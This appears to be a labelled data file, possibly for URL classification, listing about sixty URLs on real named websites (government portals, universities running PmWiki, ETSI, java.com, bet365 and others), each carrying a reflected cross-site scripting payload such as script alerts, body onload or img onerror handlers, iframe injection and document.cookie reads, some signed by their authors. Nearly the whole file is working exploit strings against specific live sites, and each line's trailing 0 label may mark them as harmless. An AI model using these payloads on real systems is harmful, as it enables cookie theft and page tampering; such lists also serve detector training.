+http://www.secult.es.gov.br/blogs/?id=%22%3E%3Cscript%3Ealert%281337%29%3C/script%3E,0
+"http://www2.portoalegre.rs.gov.br/smdhsu/default.php?reg=80&p_secao=1%20target=%22%3E%3Cscript%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/script%3E",0
+http://www.conduit.com/Community/Forum/Announcements.aspx?threadid=%22%27%3E%3Cimg%20src=vul%20onerror=alert%28%27r007k17-w%27%29%3E,0
+http://webapp.etsi.org/3GPPRegistration/fUnRegister.asp?qMeeting=29942&qUsername=%22%3E%3Cbody%20background=%22http://www.lenagold.ru/fon/geom/shar/raz/razshar115.jpg%22%3E%3Cscript%3Ealert%28%22ETSI%20XSS%20by%20Sony%20http://st2tea.blogspot.com%22%29%3C/script%3E%3Ciframe%20width=%22540%22%20height=%22450%22%20src=%22http://www.youtube.com/embed/34C41eEpM48%22%20frameborder=%220%22%20allowfullscreen%3E%3C/iframe%3E%3Cimg%20src=http://www.lenagold.ru/fon/clipart/k/kot/kosh395.gif%20align=center%3E,0
+"http://etsi-eshop.etsi.org/ecommerce/include/ProcessError.asp?ErrNb=-2147217887&Message=ODBC+driver+does+not+support+the+requested+properties.%3Cbr%3E%28Select+*+From+Customer+Where+EMAIL%3D%27%27%27;alert%28String.fromCharCode%2888,83,83%29%29//\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E",0
+http://www.java.com/jsp_utils/PrintPage.jsp?url=%3Cscript%3Ealert%281%29%3C/script%3E,0
+http://developers.sun.com//jsp_utils/PrintPage.jsp?url=%3Cscript%3Ealert%281%29%3C/script%3E,0
+http://java.sun.com/jsp_utils/PrintPage.jsp?url=<script>alert(1)</script>,0
+http://www.nero.com/inc/poll/showpoll.php?p=XV9NbwYIAQEABWcH%22%3E%3Cscript%3Ealert%28/longrifle0x/%29%3C/script%3Ea&c=81804,0
+http://www.i12.ch/filedemath/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+"http://www.e-soft24.com/scripts/membershipsite/manager/index.php?action=search&key=/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://download.cnet.com/1770-2137_4-0.html?tag=pfindersrch&searchtype=downloads&query=Google&filter=platform=Windows|&filterName=platform=""/><iframe src=""http://xssed.com""></iframe>",0
+http://www.songchangui.jp/board/?tab=5&tabs=2&mode=view%22%3E%3Cscript%3Ealert%28/XSS/%29%3C/script%3E&idx=145&returnUrl=\,0
+http://www.internetdisk.co.kr/about/reference_success.php?tab=mcst%22%3E%3C/script%3E%3Cscript%3Ealert%28/xss/%29%3C/script%3E,0
+http://www.inbumtv.com/inbumtv_new/bbs/search.php?srows=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&gr_id=&sfl=wr_subject||wr_content&stx=&sop=or#g4_head,0
+"http://www.aboki.net/board/mdiary.html?uid=19&list_page=""><script>alert(document.cookie);</script>",0
+http://www.unice.fr/elec/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://www.seoulsemicon.co.kr/kr/global/login.asp?returnUrl=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E,0
+http://www.ime.unicamp.br/~gplanas/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://frab.math.cnrs.fr/index.php?n=Main.WikiSandbox?from=Main.WikiSandbox?from=%22/><bodyonload=alert(1)>,0
+http://nceub.commoncense.info/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://www.math.u-bordeaux1.fr/ED/ecole_doctorale/index.php?n=Main.WikiSandbox?from=%22/><bodyonload=alert(1)>,0
+http://escluster.uea.ac.uk/eswiki/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://www.driver-support.eu/pmwiki/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://www.atnf.csiro.au/vlbi/wiki/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://www-lih.univ-lehavre.fr/~serin/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://www.ctp2.info/aewiki/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://www.bet365.com/home/Flash_InPlay/Flash_Tester.asp?size=1&detectflash=false&Mode=1&flsver=%22%3E%3Cscript%3Eprompt(%22XSS-Made%20in%20BG%22)%3C/script%3E&lng=19,0
+http://www.mnf.uzh.ch/geowiki/glopp/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://www.irrlicht3d.org/wiki/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://mech2009.vtk.be/wiki/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://www2.farmbio.uu.se/pmwiki/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://www.labri.fr/perso/delmas/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://fluid.media.mit.edu/courses/2010-haiti/index.php?n=Main.WikiSandbox?from=%22/><bodyonload=alert(1)>,0
+http://ahpi.math.cnrs.fr/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://hokulea.soest.hawaii.edu/ocn435/wiki/index.php?n=Main.WikiSandbox?from=%22/><bodyonload=alert(1)>,0
+http://www.hri.dept.shef.ac.uk/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://doumenc.org/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://www.carmster.com/hci/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://it-claim.ru/wiki/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://www.securepay.com/help/securepay/index.php?n=Main.WikiSandbox?from=%22/><bodyonload=alert(1)>,0
+http://www.outre-reve.fr/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://www.amwf.net/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://www.coredumb.net/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://elbanet.ethz.ch/wikifarm/karidol/index.php?n=Main.WikiSandbox?from=%22/><bodyonload=alert(1)>,0
+http://atlaswww.hep.anl.gov/asc/Dec08_wiki/index.php?n=Main.WikiSandbox?from=%22/><bodyonload=alert(1)>,0
+http://robotics.research.yale.edu/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://mleg.cse.sc.edu/edu/csce822/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://weblab.reliablehosting.com/wiki/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://groups.csail.mit.edu/EVO-DesignOpt/GPBenchmarks/index.php?n=Main.WikiSandbox?from=%22/><bodyonload=alert(1)>,0
+http://www.redaxo.org/de/wiki/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://wiki.fewo-boosmann.de/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://www.adriano.it/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://nirog.info/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://www.gordoman.de/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://www.nooreg.no/Index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://geeks.ues.edu.sv/wiki/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://saloweb.nl/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://people.na.infn.it/~chiefari/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
+http://offshorelm.com/wiki/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>,0
